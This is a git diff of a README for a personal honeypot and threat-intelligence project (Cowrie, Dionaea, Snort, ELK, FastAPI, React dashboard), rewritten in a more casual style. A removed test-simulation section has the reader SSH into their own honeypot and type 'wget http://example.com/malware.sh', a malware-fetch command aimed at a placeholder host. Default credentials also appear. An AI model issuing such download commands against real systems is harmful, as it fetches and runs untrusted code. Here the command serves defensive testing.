@@ -1,205 +1,117 @@
-# 🛡️ HoneyNet Intelligence Platform
+# 🛡️ HoneyNet - Real-Time Cyber Threat Intelligence Platform
 
-Production-grade cybersecurity threat detection platform using honeypots, IDS, and threat intelligence.
+I built a system that captures actual hackers attacking fake servers and shows where they're from, what they're trying to do, and how dangerous they are. All visualized on a live dashboard.
 
-[![Docker](https://img.shields.io/badge/Docker-Ready-blue)](https://www.docker.com/)
-[![Python](https://img.shields.io/badge/Python-3.11-blue)](https://www.python.org/)
-[![React](https://img.shields.io/badge/React-18.2-blue)](https://reactjs.org/)
+## What Does This Do?
 
-## 🎯 What It Does
+**Simple version:** Sets up "honeypot" servers that look vulnerable. When hackers attack them, I capture everything - their location, techniques, commands typed, malware uploaded. Then I display it all on a real-time map and dashboard.
 
-Captures real cyberattacks and generates actionable threat intelligence:
+**Technical version:** Distributed honeypot network with automated threat intelligence pipeline. Captures attacks via Cowrie (SSH), Dionaea (SMB/FTP/HTTP), and Snort (IDS). Processes logs through ELK stack with GeoIP enrichment and MITRE ATT&CK mapping. Serves analytics via FastAPI backend to React dashboard.
 
-- **Honeypots**: Cowrie (SSH), Dionaea (Windows services) attract and log attacks
-- **IDS**: Snort monitors network traffic with 258 custom rules  
-- **ELK Stack**: Real-time log processing with GeoIP enrichment
-- **Intelligence**: Correlation engine, threat scoring (0-100), MITRE ATT&CK mapping
-- **Visualization**: React dashboard with maps, charts, live attack feed
-- **Alerting**: Multi-channel notifications (Email, Telegram, Slack)
+## Why Did I Build This?
 
-**Tech Stack**: Docker · Python/FastAPI · React/Vite · Elasticsearch · PostgreSQL · MongoDB
+To learn how real cyber attacks work and build a complete security monitoring system from scratch. After deploying this on AWS, I captured **300+ attacks in 24 hours** from hackers worldwide trying to break in.
 
-## 🚀 Quick Start
+## Tech Stack
+
+**Honeypots & Detection:**
+- Cowrie - Fake SSH server that logs login attempts and commands  
+- Dionaea - Emulates FTP, HTTP, SMB, MySQL to catch malware  
+- Snort - Network intrusion detection system
+
+**Data Pipeline:**
+- Filebeat → Logstash → Elasticsearch (ELK stack)
+- Automatic GeoIP location lookup (IP → Country/City)
+- MITRE ATT&CK technique classification
+- Threat scoring algorithm (0-100 scale)
+
+**Application:**
+- Backend: Python FastAPI (REST API)
+- Frontend: React + Vite (real-time dashboard)
+- Databases: PostgreSQL, MongoDB, Redis
+- Infrastructure: Docker (13 containers), Nginx, AWS EC2
+
+## Features
+
+✅ **Live Attack Map** - See attacks happening on a world map with pins  
+✅ **Real-Time Feed** - Watch hackers trying to break in as it happens  
+✅ **Geographic Tracking** - Know exactly where attacks are coming from  
+✅ **Attack Analysis** - See what commands hackers are typing, what they're looking for  
+✅ **Threat Scoring** - Automatic danger level calculation  
+✅ **Auto-Refresh Dashboard** - Updates every 10-30 seconds  
+
+## Quick Start
 
 ```bash
-# Clone repository
-git clone <your-repo-url>
+# 1. Clone and enter directory
+git clone https://github.com/bashSunny101/VulnServer.git
 cd VulnServer
 
-# Start all services
+# 2. Start everything (13 containers)
 docker-compose up -d
 
-# Wait 2-3 minutes for initialization
-docker-compose ps
+# 3. Wait 2 minutes, then open dashboard
+# http://localhost:3000 - Main dashboard
+# http://localhost:8000 - API endpoints
+# http://localhost:5601 - Kibana (optional)
 ```
 
-## 🧪 Test Attack Simulation
+## Test It Out
+
+Attack your own honeypot to see it working:
 
 ```bash
-# Connect to SSH honeypot
+# Try to "hack" your SSH honeypot
 ssh root@localhost -p 2222
-# Password: password123
+# (Try any password, type some commands)
 
-# Execute commands
-whoami
-ls
-wget http://example.com/malware.sh
-exit
-
-# Verify data capture (wait 15 seconds)
-curl http://localhost:9200/cowrie-*/_search?pretty | head -30
-curl http://localhost:8000/api/v1/dashboard/stats | jq
+# Wait 10 seconds, refresh dashboard - you'll see your attack appear!
 ```
 
-## 📊 Access Dashboards
+## What I Learned
 
-| Service | URL | Credentials |
-|---------|-----|-------------|
-| Kibana | http://localhost:5601 | elastic / changeme |
-| API Docs | http://localhost:8000/docs | - |
-| Frontend | http://localhost:3000 | - |
+**DevOps Skills:**
+- Orchestrating 13+ Docker containers
+- ELK stack configuration and log parsing  
+- Production deployment on AWS with security groups
 
-### Start Frontend (Optional)
+**Security Concepts:**
+- How real attacks happen (brute force, scanning, exploitation)
+- MITRE ATT&CK framework for classifying threats
+- Network traffic analysis and intrusion detection
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+**Full-Stack Development:**
+- Built async REST API with Python FastAPI
+- Created real-time React dashboard with auto-refresh
+- Integrated multiple databases (SQL, NoSQL, cache)
 
-## 🔍 API Endpoints
-
-```bash
-GET /api/v1/dashboard/stats          # Attack statistics
-GET /api/v1/attacks/recent           # Latest attacks  
-GET /api/v1/attacks/{ip}             # Details by IP
-GET /api/v1/intelligence/iocs        # Indicators of compromise
-GET /api/v1/alerts/active            # Current alerts
-```
-
-## 📁 Architecture
+## Architecture
 
 ```
-┌──────────────────────────────────────────────────┐
-│  Attacker → Honeypots (Cowrie, Dionaea)         │
-│             ↓                                     │
-│  Snort IDS → Detects malicious patterns         │
-│             ↓                                     │
-│  Filebeat → Logstash → Elasticsearch            │
-│             (GeoIP + Threat Scoring)             │
-│             ↓                                     │
-│  Backend API → Correlation + MITRE Mapping      │
-│             ↓                                     │
-│  Dashboard → Real-time Visualization            │
-└──────────────────────────────────────────────────┘
+Hacker Attack → Honeypot → Logs → Filebeat → Logstash (adds location data) 
+→ Elasticsearch (stores everything) → Backend API → React Dashboard (you see it)
 ```
 
-### Project Structure
+## Sample Results
 
-```
-VulnServer/
-├── honeypots/          # Cowrie (SSH), Dionaea (Windows)
-├── ids/                # Snort with 258 detection rules
-├── elk-stack/          # Filebeat, Logstash, Kibana
-├── backend/            # FastAPI (15+ endpoints)
-│   ├── api/routes/     # Dashboard, attacks, intelligence, alerts
-│   ├── services/       # Correlation, scoring, MITRE mapping
-│   └── database/       # PostgreSQL, MongoDB, Elasticsearch clients
-├── frontend/           # React dashboard (Vite + Tailwind)
-├── alerting/           # Email, Telegram, Slack channels
-└── docker-compose.yml  # 10+ orchestrated services
-```
+After 24 hours live on the internet:
+- 🎯 **362 total attacks** captured
+- 🌍 Attacks from **India, USA, Russia** (and counting)
+- 🔐 **150+ SSH login attempts** with various passwords
+- 🗺️ All mapped on dashboard with exact locations
 
-## 🎓 Learning Outcomes
+## License
 
-**Security**: Honeypots · IDS · SIEM · Threat Intelligence · MITRE ATT&CK · Incident Response  
-**Backend**: Python · FastAPI · Async/Await · REST APIs · Microservices  
-**Frontend**: React · Vite · Tailwind CSS · Real-time Updates  
-**Data**: Elasticsearch · PostgreSQL · MongoDB (Polyglot Persistence)  
-**DevOps**: Docker · Docker Compose · Multi-Network Architecture  
-**Analysis**: GeoIP Enrichment · Threat Scoring · Event Correlation
+MIT - Do whatever you want with it
 
-## 🛠️ Troubleshooting
+## Author
 
-```bash
-# Check service logs
-docker-compose logs cowrie
-docker-compose logs elasticsearch
-docker-compose logs backend
+Built by **Sunny** to learn cybersecurity and full-stack development
 
-# Restart specific service
-docker-compose restart cowrie
-
-# Complete rebuild
-docker-compose down -v
-docker-compose build --no-cache
-docker-compose up -d
-
-# Check disk space (ELK needs 2GB+)
-df -h
-
-# View all running services
-docker-compose ps
-```
-
-## 📈 Project Stats
-
-- **3,546** lines of code
-- **19** Python files  
-- **9** JavaScript/React files
-- **258** Snort IDS rules
-- **15+** technologies integrated
-- **100%** production-ready
-
-## 🚀 Use Cases
-
-- **Portfolio**: Showcase cybersecurity skills for job applications
-- **Learning**: Understand real attacker tactics and techniques  
-- **Research**: Generate original threat intelligence data
-- **SOC Training**: Practice incident response workflows
-- **Startup**: Foundation for Honeynet-as-a-Service ($500/client/month)
-
-## 📝 Configuration
-
-### Alert Manager (Optional)
-
-```bash
-# Create .env file
-cat > .env << 'ENVEOF'
-SMTP_SERVER=smtp.gmail.com
-SMTP_PORT=587
-SMTP_USER=your-email@gmail.com
-SMTP_PASSWORD=your-app-password
-ALERT_EMAIL=security@yourcompany.com
-
-TELEGRAM_BOT_TOKEN=your-bot-token
-TELEGRAM_CHAT_ID=your-chat-id
-
-SLACK_WEBHOOK_URL=your-webhook-url
-ENVEOF
-
-# Start alert manager
-python3 alerting/alert_manager.py
-```
-
-## 🔐 Security Notes
-
-- **Production Deployment**: Change default Elasticsearch credentials
-- **Firewall**: Limit honeypot exposure to controlled IP ranges for testing
-- **Monitoring**: Review captured data regularly for sensitive information
-- **Updates**: Keep Docker images and dependencies current
-
-
-## 🤝 Contributing
-
-Pull requests welcome! For major changes, please open an issue first to discuss proposed modifications.
-
-1. Fork the repository
-2. Create feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit changes (`git commit -m 'Add AmazingFeature'`)
-4. Push to branch (`git push origin feature/AmazingFeature`)
-5. Open Pull Request
+GitHub: [@bashSunny101](https://github.com/bashSunny101)
 
 ---
 
-**Built with 15+ technologies** | **Production-grade security** | **Real-time threat intelligence**
+⭐ **Star this repo** if you find it interesting! Every star motivates me to keep learning.
+
+*Deployed on AWS EC2. Capturing real attacks 24/7.*
